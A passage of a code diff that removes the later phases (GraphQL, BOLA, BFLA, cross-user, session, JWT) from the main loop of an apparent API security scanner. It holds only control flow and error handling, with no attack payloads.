-            con.err(f"Phase data_exposure error: {exc}")
-    else:
-        con.status("data_exposure", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 9: GraphQL
-    # ------------------------------------------------------------------
-    if not _skip("graphql"):
-        try:
-            phase_graphql(settings, sess, auth_sess, output)
-        except Exception as exc:
-            con.err(f"Phase graphql error: {exc}")
-    else:
-        con.status("graphql", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 10: BOLA
-    # ------------------------------------------------------------------
-    if not _skip("bola"):
-        try:
-            phase_bola(settings, auth_sess, output, api_inventory)
-        except Exception as exc:
-            con.err(f"Phase bola error: {exc}")
-    else:
-        con.status("bola", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 11: BFLA
-    # ------------------------------------------------------------------
-    if not _skip("bfla"):
-        try:
-            phase_bfla(settings, auth_sess, output, api_inventory)
-        except Exception as exc:
-            con.err(f"Phase bfla error: {exc}")
-    else:
-        con.status("bfla", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 12: Cross-User
-    # ------------------------------------------------------------------
-    if not _skip("cross_user"):
-        try:
-            phase_cross_user(settings, auth_sess, auth2_sess, output, api_inventory)
-        except Exception as exc:
-            con.err(f"Phase cross_user error: {exc}")
-    else:
-        con.status("cross_user", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 13: Session
-    # ------------------------------------------------------------------
-    if not _skip("session"):
-        try:
-            phase_session(settings, auth_sess, output, api_inventory)
-        except Exception as exc:
-            con.err(f"Phase session error: {exc}")
-    else:
-        con.status("session", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 14: JWT
-    # ------------------------------------------------------------------
-    if not _skip("jwt"):
-        try:
-            phase_jwt(settings, auth_sess, output, api_inventory)
-        except Exception as exc:
-            con.err(f"Phase jwt error: {exc}")
-    else:
-        con.status("jwt", "skip", "Disabled in settings")
-
-    # ------------------------------------------------------------------
-    # Save all results
-    # ------------------------------------------------------------------
-    output.save_all(api_inventory)
-    output.print_summary()
-    con.info(f"Reports saved to: {scan['project']}/")
-
+        con.info(f"Reports saved to: {t_scan['project']}/")
 
 if __name__ == "__main__":
     main()
